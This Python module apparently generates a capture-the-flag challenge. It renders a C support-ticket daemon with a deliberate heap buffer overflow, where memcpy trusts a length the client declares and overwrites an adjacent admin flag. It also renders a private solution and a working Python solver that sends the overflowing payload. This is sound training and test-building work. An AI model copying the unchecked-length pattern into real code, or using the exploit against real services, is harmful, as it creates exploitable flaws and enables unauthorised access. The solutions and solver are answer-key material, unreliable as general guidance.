"""Renderer for the ``binary_heap_exploit`` family.

A networked C service (a tiny legacy support-ticket daemon) with a heap-based
buffer overflow (CWE-122/CWE-121 family): the daemon ``malloc``s a per-session
struct with a fixed-size name buffer followed by an admin flag, then trusts a
client-declared length when copying the client's note text into that buffer.
Supplying a length longer than the buffer clobbers the adjacent admin flag,
letting an unauthenticated client flip itself to "admin" and pull the flag
back out over the same socket.

Pure module -- no I/O, no imports of ``families`` (which imports this module
instead, to avoid a circular import). ``render`` is a pure function of
``(spec, rng, cve_record)``: the same inputs always produce a byte-identical
``{relative_path: content}`` mapping.
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ..models import ChallengeSpec
from ..yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ..cve_source import CveRecord


# --- Renderer module interface (see families.py docstring / project spec) ----

FAMILY_NAME = "binary_heap_exploit"
CATEGORY = "binary"
MODES: tuple[str, ...] = ("red",)
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "A networked C service with a heap-based memory-corruption bug "
    "(CWE-122/CWE-121): a fixed-size per-session buffer sits next to an "
    "admin flag inside a single malloc'd struct, and the daemon trusts a "
    "client-declared length when copying into it. The player must reverse "
    "the wire protocol, work out the struct layout from the buffer size, "
    "and send an overlong note that overflows into the admin flag to "
    "unlock a privileged command that discloses the flag."
)
COMPOSE_MARKERS: tuple[str, ...] = ("vuln",)
SCORING_HINTS: dict = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "low",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/vuln/Dockerfile",
    "services/vuln/Makefile",
    "services/vuln/vuln.c",
    "public/description.md",
    "public/hints.yaml",
    "private/solution.md",
    "private/variant.json",
    "private/checkpoints.yaml",
    "private/solver.py",
    "tests/healthcheck.py",
)


# --- Variant -----------------------------------------------------------------


@dataclass(frozen=True)
class Variant:
    service_name: str
    banner: str
    port: int
    name_buf_size: int
    admin_field: str
    set_word: str
    dump_word: str
    overflow_len: int
    filler_byte: str
    flag: str


_SERVICE_NAMES = ("supportd", "ticketd", "noted", "deskd", "helpdaemon")
_ADMIN_FIELDS = ("is_admin", "is_root", "priv_flag", "admin_ok", "staff_mode")
_SET_WORDS = ("SET", "STORE", "NOTE", "LOAD", "WRITE")
_DUMP_WORDS = ("DUMP", "REVEAL", "EXPORT", "FETCH", "DISCLOSE")
# Multiples of 4 so the compiler places the trailing `int` admin field at
# exactly offset `name_buf_size` in the struct, with no implicit padding.
_NAME_BUF_SIZES = (32, 48, 64, 96)
_FILLER_BYTES = ("A", "B", "Q", "X", "Z")


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _variant(rng: random.Random) -> Variant:
    service_name = rng.choice(_SERVICE_NAMES)
    banner_version = f"{rng.randrange(1, 4)}.{rng.randrange(0, 9)}"
    banner = f"{service_name} v{banner_version} ready"
    port = rng.randrange(20000, 40000)
    name_buf_size = rng.choice(_NAME_BUF_SIZES)
    admin_field = rng.choice(_ADMIN_FIELDS)
    set_word = rng.choice(_SET_WORDS)
    dump_word = rng.choice(_DUMP_WORDS)
    filler_byte = rng.choice(_FILLER_BYTES)
    # Enough bytes to fully cover the name buffer *and* every byte of the
    # trailing 4-byte admin int, so the overflow is unambiguous regardless
    # of endianness.
    overflow_len = name_buf_size + 4
    flag = f"ctf{{heap_struct_clobber_{_token_hex(rng, 6)}}}"
    return Variant(
        service_name=service_name,
        banner=banner,
        port=port,
        name_buf_size=name_buf_size,
        admin_field=admin_field,
        set_word=set_word,
        dump_word=dump_word,
        overflow_len=overflow_len,
        filler_byte=filler_byte,
        flag=flag,
    )


def _cve_context(spec: ChallengeSpec, cve_record: "CveRecord | None") -> str:
    if cve_record is not None:
        cwe = ", ".join(cve_record.cwe_ids) or "CWE-122"
        return (
            f"This challenge is modeled after **{cve_record.cve_id}** ({cwe}): "
            f"{cve_record.description}"
        )
    if spec.cve_refs:
        return (
            f"This challenge is themed around {', '.join(spec.cve_refs)}, a "
            "heap-corruption class vulnerability (CWE-122)."
        )
    return (
        "This challenge is themed around a class of real-world heap-based "
        "buffer overflow vulnerabilities (CWE-122 / CWE-121)."
    )


# --- Top-level render ----------------------------------------------------------


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    if spec.mode not in MODES:
        raise ValueError(
            f"binary_heap_exploit does not support mode {spec.mode!r}; "
            f"supported modes: {MODES!r}"
        )

    v = _variant(rng)
    context = _cve_context(spec, cve_record)

    public_hints = [
        {
            "level": 1,
            "text": f"Connect to the service and read the banner: `nc <host> {v.port}`.",
        },
        {
            "level": 2,
            "text": (
                f"The `{v.set_word}` command takes a length prefix. What happens "
                "if the length you declare doesn't match the size of the buffer "
                "the daemon actually reserved for it?"
            ),
        },
        {
            "level": 3,
            "text": (
                f"The session struct is `{v.name_buf_size}` bytes of name "
                f"followed by a 4-byte flag. Overflowing by exactly that many "
                f"bytes flips something the `{v.dump_word}` command checks."
            ),
        },
    ]

    files = {
        "docker-compose.yml": _compose(v),
        "services/vuln/Dockerfile": _dockerfile(v),
        "services/vuln/Makefile": _makefile(),
        "services/vuln/vuln.c": _vuln_c(v),
        "public/description.md": _description(spec, v, context),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "private/solution.md": _solution(v, context),
        "private/variant.json": _variant_json(spec, v),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "private/solver.py": _solver(v),
        "tests/healthcheck.py": _healthcheck(v),
    }
    return files


# --- File builders --------------------------------------------------------------


def _compose(v: Variant) -> str:
    return f"""services:
  vuln:
    build: ./services/vuln
    environment:
      CTFGEN_FLAG: ${{CTFGEN_FLAG:-}}
    ports:
      - "{v.port}:{v.port}"
    networks: [frontend]
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64

networks:
  frontend:
"""


def _dockerfile(v: Variant) -> str:
    return f"""FROM gcc:12-bookworm AS build
WORKDIR /src
COPY Makefile vuln.c ./
RUN make

FROM debian:bookworm-slim
RUN useradd --uid 1000 --create-home ctfuser
COPY --from=build /src/vuln /usr/local/bin/vuln
USER ctfuser
EXPOSE {v.port}
ENTRYPOINT ["/usr/local/bin/vuln"]
"""


def _makefile() -> str:
    return """CC ?= gcc
CFLAGS ?= -O0 -g -fno-stack-protector -Wall

vuln: vuln.c
\t$(CC) $(CFLAGS) -o vuln vuln.c

clean:
\trm -f vuln

.PHONY: clean
"""


def _vuln_c(v: Variant) -> str:
    return f"""#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT {v.port}
#define LINE_MAX 256
#define BODY_MAX 4096

static const char BANNER[] = "{v.banner}\\n";

/* Per-session state. `name` is a fixed-size buffer for the client's note;
 * `{v.admin_field}` is the privilege flag checked by the `{v.dump_word}`
 * command below. Both fields live in the *same* heap allocation -- the
 * struct is malloc'd as one block, and the compiler places `{v.admin_field}`
 * immediately after `name` (name_buf_size is a multiple of 4, so there is no
 * padding between them). */
typedef struct {{
    char name[{v.name_buf_size}];
    int {v.admin_field};
}} session_t;

static const char *FLAG;

static ssize_t read_line(int fd, char *buf, size_t cap) {{
    size_t n = 0;
    while (n + 1 < cap) {{
        char c;
        ssize_t r = recv(fd, &c, 1, 0);
        if (r <= 0) return r;
        if (c == '\\n') break;
        buf[n++] = c;
    }}
    buf[n] = '\\0';
    return (ssize_t) n;
}}

static ssize_t read_exact(int fd, char *buf, size_t len) {{
    size_t got = 0;
    while (got < len) {{
        ssize_t r = recv(fd, buf + got, len - got, 0);
        if (r <= 0) return r;
        got += (size_t) r;
    }}
    return (ssize_t) got;
}}

static void handle_client(int fd) {{
    session_t *sess = malloc(sizeof(session_t));
    if (!sess) {{
        close(fd);
        return;
    }}
    memset(sess->name, 0, sizeof(sess->name));
    sess->{v.admin_field} = 0;

    send(fd, BANNER, strlen(BANNER), 0);

    char line[LINE_MAX];
    char body[BODY_MAX];
    const char *set_prefix = "{v.set_word} ";

    for (;;) {{
        ssize_t n = read_line(fd, line, sizeof(line));
        if (n <= 0) break;

        if (strncmp(line, set_prefix, strlen(set_prefix)) == 0) {{
            int len = atoi(line + strlen(set_prefix));
            if (len <= 0 || (size_t) len > sizeof(body)) {{
                send(fd, "ERR bad length\\n", 16, 0);
                continue;
            }}
            if (read_exact(fd, body, (size_t) len) <= 0) break;

            /* BUG (CWE-122): the daemon trusts the client-declared `len`
             * instead of clamping it to sizeof(sess->name), so a client
             * that declares len > {v.name_buf_size} walks straight past the
             * name field into whatever the compiler placed right after it
             * in the struct. */
            memcpy(sess->name, body, (size_t) len);
            send(fd, "OK\\n", 3, 0);
        }} else if (strncmp(line, "{v.dump_word}", strlen("{v.dump_word}")) == 0) {{
            if (sess->{v.admin_field}) {{
                send(fd, FLAG, strlen(FLAG), 0);
                send(fd, "\\n", 1, 0);
            }} else {{
                send(fd, "denied\\n", 7, 0);
            }}
        }} else if (strncmp(line, "QUIT", 4) == 0) {{
            break;
        }} else {{
            send(fd, "ERR unknown command\\n", 21, 0);
        }}
    }}

    free(sess);
    close(fd);
}}

int main(void) {{
    FLAG = getenv("CTFGEN_FLAG");
    if (!FLAG || !FLAG[0]) FLAG = "{v.flag}";

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {{
        perror("socket");
        return 1;
    }}

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *) &addr, sizeof(addr)) < 0) {{
        perror("bind");
        return 1;
    }}
    if (listen(server_fd, 16) < 0) {{
        perror("listen");
        return 1;
    }}

    fprintf(stderr, "{v.service_name} listening on :%d\\n", PORT);

    for (;;) {{
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr *) &client_addr, &client_len);
        if (client_fd < 0) continue;

        pid_t pid = fork();
        if (pid == 0) {{
            close(server_fd);
            handle_client(client_fd);
            _exit(0);
        }} else if (pid > 0) {{
            close(client_fd);
        }} else {{
            close(client_fd);
        }}
    }}

    return 0;
}}
"""


def _description(spec: ChallengeSpec, v: Variant, context: str) -> str:
    return f"""# {spec.title}

A legacy internal daemon, `{v.service_name}`, is listening on port `{v.port}`.
It lets a connected client stash a short note in its session and then, on
request, dump some privileged operator data.

{context}

Connect and read the banner:

```
nc <host> {v.port}
```

From there, the daemon speaks a small line-based protocol. Everything after
that is up to you to reverse: what commands does it accept, what does the
success/failure response tell you, and what happens near the edges of its
buffers?

Your goal: retrieve the flag (format `ctf{{...}}`) from `{v.service_name}`
without any credentials.

This challenge is generated with per-instance variation: the port, buffer
size, admin-flag field name, and command vocabulary may differ across
generated instances.
"""


def _solution(v: Variant, context: str) -> str:
    return f"""# Private Solution

{context}

## The bug

`{v.service_name}` allocates one `session_t` per connection with `malloc`:

```c
typedef struct {{
    char name[{v.name_buf_size}];
    int {v.admin_field};
}} session_t;
```

The `{v.set_word} <len>` command reads exactly `<len>` raw bytes from the
socket and then does:

```c
memcpy(sess->name, body, (size_t) len);
```

`len` is attacker-controlled and is only checked against the size of a much
larger scratch buffer (`BODY_MAX`), never against `sizeof(sess->name)`
(`{v.name_buf_size}`). Because `{v.name_buf_size}` is a multiple of 4, the
compiler places `{v.admin_field}` at exactly offset `{v.name_buf_size}` in
the struct with no padding in between -- so a `{v.set_word}` body of length
`{v.name_buf_size} + 4` (or more) overflows straight out of `name` and
overwrites all four bytes of `{v.admin_field}` with attacker-chosen data.
Any nonzero value there makes `sess->{v.admin_field}` truthy.

## Solve path

1. Connect to `{v.service_name}` on port `{v.port}` and read the banner.
2. Send `{v.set_word} {v.overflow_len}` followed by `{v.overflow_len}` bytes
   of filler (e.g. `{v.filler_byte * v.overflow_len}`). The last 4 bytes
   land on `{v.admin_field}` and only need to be non-zero.
3. Send `{v.dump_word}` on the same connection (the overflow is
   session-scoped: `sess` is one `malloc` per connection, so this only
   works on the connection that sent the overflow).
4. The daemon checks `sess->{v.admin_field}` and, now truthy, replies with
   the flag.

This teaches struct-adjacency heap corruption: no shellcode, no ASLR
bypass, no return-address games -- just trusting a length the client
controls when writing into a fixed-size neighbor field.
"""


def _solver(v: Variant) -> str:
    return f'''from __future__ import annotations

import argparse
import re
import socket
import sys


def _recv_until(sock: socket.socket, marker: bytes = b"\\n", cap: int = 4096) -> bytes:
    data = b""
    while marker not in data and len(data) < cap:
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default={v.port})
    args = parser.parse_args()

    with socket.create_connection((args.host, args.port), timeout=5) as sock:
        sock.settimeout(5)
        _recv_until(sock)  # banner

        overflow_len = {v.overflow_len}
        payload = b"{v.filler_byte}" * overflow_len
        sock.sendall(f"{v.set_word} {{overflow_len}}\\n".encode() + payload)
        _recv_until(sock)  # "OK"

        sock.sendall(b"{v.dump_word}\\n")
        response = _recv_until(sock, cap=4096).decode("utf-8", errors="replace")

        match = re.search(r"ctf\\{{[^}}]+\\}}", response)
        if not match:
            raise RuntimeError(f"flag not found in response: {{response!r}}")
        print(match.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _healthcheck(v: Variant) -> str:
    return f'''from __future__ import annotations

import argparse
import socket
import sys


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default={v.port})
    args = parser.parse_args()

    with socket.create_connection((args.host, args.port), timeout=5) as sock:
        sock.settimeout(5)
        banner = sock.recv(256)
        assert banner, "no banner received"
        assert b"{v.service_name}" in banner
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _variant_json(spec: ChallengeSpec, v: Variant) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "routes": {
                "host": "vuln",
                "port": v.port,
            },
            "tokens": {
                "service_name": v.service_name,
                "banner": v.banner,
                "name_buf_size": v.name_buf_size,
                "admin_field": v.admin_field,
                "set_word": v.set_word,
                "dump_word": v.dump_word,
                "overflow_len": v.overflow_len,
                "filler_byte": v.filler_byte,
            },
            "flag": v.flag,
        },
        indent=2,
        sort_keys=True,
    ) + "\n"
